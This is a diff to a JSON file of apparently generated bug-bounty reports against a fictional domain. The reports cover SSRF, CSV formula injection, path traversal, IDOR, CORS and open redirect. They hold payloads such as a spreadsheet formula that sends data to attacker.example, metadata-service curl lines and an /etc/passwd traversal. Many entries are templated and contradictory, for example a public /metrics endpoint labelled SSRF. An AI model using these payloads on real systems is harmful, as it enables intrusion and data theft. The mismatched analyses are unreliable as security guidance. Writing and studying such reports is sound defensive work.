+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenlichtmed.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3260,7 +3281,8 @@
           "offset": "3d 12h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3391,7 +3413,8 @@
           "offset": "1d 5h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://cloud.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3550,7 +3573,8 @@
           "offset": "4d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://updates.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3698,7 +3722,8 @@
           "offset": "9d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://cloud.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -3779,7 +3804,8 @@
           "offset": "6h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://cloud.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3904,7 +3930,8 @@
           "offset": "4d 8h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://cloud.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3999,7 +4026,8 @@
           "offset": "3d 10h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://cloud.alpenlichtmed.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4106,7 +4134,8 @@
           "offset": "1d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://cloud.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4265,7 +4294,8 @@
           "offset": "7d 10h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: admin; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4384,7 +4414,8 @@
           "offset": "14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.alpenlichtmed.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4546,7 +4577,8 @@
           "offset": "7d 13h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://cloud.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4694,7 +4726,8 @@
           "offset": "1d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4780,7 +4813,8 @@
           "offset": "2d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4894,7 +4928,8 @@
           "offset": "4h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://cloud.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5023,7 +5058,8 @@
           "offset": "7d 9h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://cloud.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5114,7 +5150,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://cloud.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5241,7 +5278,8 @@
           "offset": "5d 19h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://cloud.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5421,7 +5459,8 @@
           "offset": "6d 8h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://updates.alpenlichtmed.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5557,7 +5596,8 @@
           "offset": "9d 10h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/import`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5714,7 +5754,8 @@
           "offset": "2d 11h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5812,7 +5853,8 @@
           "offset": "16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://docs.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5930,7 +5972,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6031,7 +6074,8 @@
           "offset": "1d 19h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6155,7 +6199,8 @@
           "offset": "23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://docs.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6274,7 +6319,8 @@
           "offset": "1d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6390,7 +6436,8 @@
           "offset": "1d 13h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://docs.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6481,7 +6528,8 @@
           "offset": "2d 6h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6604,7 +6652,8 @@
           "offset": "1d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6715,7 +6764,8 @@
           "offset": "3d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.alpenlichtmed.foo/export`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -6863,7 +6913,8 @@
           "offset": "4d 4h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -7009,7 +7060,8 @@
           "offset": "4d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
